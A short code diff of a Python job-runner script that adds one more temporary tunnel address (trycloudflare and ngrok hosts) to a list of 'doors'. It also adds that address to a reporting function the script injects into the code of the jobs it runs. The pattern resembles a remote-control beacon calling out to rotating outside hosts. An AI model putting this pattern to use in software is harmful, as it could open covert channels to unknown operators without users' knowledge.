@@ -7,6 +7,7 @@ import os, sys, json, time, base64, hashlib, subprocess, urllib.request
 
 TOK = "GOLD24"
 DOORS = [
+    "https://economic-names-available-frozen.trycloudflare.com",
     "https://letting-media-noted-territories.trycloudflare.com",
     "https://phantom-analytical-gains-curious.trycloudflare.com",
     "https://retrain-schnapps-upbeat.ngrok-free.dev",
@@ -99,7 +100,7 @@ def run_job(jid):
         "def kilo_report(msg):\n"
         "    try:\n"
         "        import json as _j, urllib.request as _u\n"
-        "        doors=['https://letting-media-noted-territories.trycloudflare.com','https://phantom-analytical-gains-curious.trycloudflare.com','https://retrain-schnapps-upbeat.ngrok-free.dev']\n"
+        "        doors=['https://economic-names-available-frozen.trycloudflare.com','https://letting-media-noted-territories.trycloudflare.com','https://phantom-analytical-gains-curious.trycloudflare.com','https://retrain-schnapps-upbeat.ngrok-free.dev']\n"
         "        h={'User-Agent':'kilo-job','ngrok-skip-browser-warning':'1'}\n"
         "        for d in doors:\n"
         "            try:\n"
